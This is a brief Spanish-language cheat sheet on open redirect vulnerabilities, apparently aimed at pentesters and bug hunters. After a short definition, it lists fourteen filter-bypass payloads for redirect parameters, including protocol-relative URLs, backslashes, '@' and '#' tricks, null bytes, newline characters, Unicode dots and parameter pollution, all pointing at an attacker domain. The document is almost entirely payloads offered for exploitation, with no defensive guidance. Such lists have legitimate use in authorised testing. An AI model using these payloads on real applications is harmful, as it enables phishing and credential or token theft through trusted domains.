# Open Redirect

Las vulnerabilidades de redirección abierta surgen cuando una aplicación incorpora datos controlables por el usuario en el objetivo de una redirección de forma no segura. Un atacante puede construir una URL dentro de la aplicación que provoque una redirección a un dominio externo arbitrario

A veces se puede encontrar en las páginas de inicio de sesión/registro/cierre de sesión, como también comprobando el código fuente de javascript

# Explotando

1 - Prueba a cambiar el dominio

    /?redir=attacker.com
    
2 - Uso de un dominio o una palabra clave incluidos en la white list

    /?redir=target.com.attacker.com
    
3 - Usando // para bypass la palabra http de la black list

    /?redir=//attacker.com
    
4 - Usando https: para bypass // de la black list

    /?redir=https:atacker.com
    
5 - Using \\ para bypass // de la black list

    /?redir=\\attacker.com
    
6 - Using \/\/ para bypass // de la black list

    /?redir=\/\/attacker.com/
    /?redir=/\/attacker.com/
    
7 - Usando %E3%80%82 para bypass el . de la black list

    /?redir=attacker%E3%80%82com
    
8 - Usando un null byte %00 para bypass el filtro de la black list

    /?redir=//attacker%00.com
    
9 - Usando parameter pollution

    /?next=host.com&next=attacker.com
    
10 - Usando @ o %40 (el navegador redirigirá a cualquier cosa después del @)

    /?redir=host.com@attacker.com
    /?redir=host.com%40attacker.com
    
11 - Usando el carácter ? (el navegador lo traducirá a /?)

    /?redir=host.com?attacker.com
    
12 - Omita el filtro si solo verifica el nombre de dominio usando %23

    /?redir=host.com%23attacker.com

13 - Usando el símbolo ° para bypass

    /?redir=host.com/°attacker.com
    
14 - Omita el filtro si solo le permite controlar la ruta usando un null byte %0d o %0a

    /?redir=/%0d/attacker.com
    /?redir=/%0a/attacker.com
